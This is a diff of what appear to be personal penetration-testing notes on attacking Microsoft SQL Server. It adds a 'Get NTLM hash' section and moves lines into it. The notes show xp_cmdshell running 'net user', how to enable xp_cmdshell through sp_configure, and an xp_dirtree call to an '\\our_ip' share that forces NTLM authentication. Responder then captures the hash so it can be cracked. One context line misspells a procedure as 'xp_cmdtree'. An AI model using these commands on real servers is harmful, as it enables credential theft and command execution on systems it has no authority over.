@@ -13,10 +13,6 @@ Use shell commands
 
 	EXEC xp_cmdshell 'net user'; # This allows us to execute commands.
 	exec xp_cmdtree 'whoami'; # This allows us to execute commands.
-	exec xp_dirtree 'c:\'; # Checks if we can list files
-	if this is successful we can now try to do a request back to us
-	exec xp_dirtree '\\our_ip\test\test';
-	we can check if we receive the request with nc. This request will attempt a ntlm authentication, so we can start responder to get the hash and then try to crack it
 
 
 If we cant use it we need to activate it.
@@ -26,7 +22,14 @@ If we cant use it we need to activate it.
 	EXEC sp_configure 'xp_cmdshell', 1;
 	RECONFIGURE;
 
+## Get NTLM hash
 
+Check if we can do a xp_dirtree
+
+	exec xp_dirtree 'c:\'; # Checks if we can list files
+	if this is successful we can now try to do a request back to us
+	exec xp_dirtree '\\our_ip\test\test';
+	we can check if we receive the request with nc. This request will attempt a ntlm authentication, so we can start responder to get the hash and then try to crack it. The test share and file dont have to exist
 
 ## Relevant Information
 
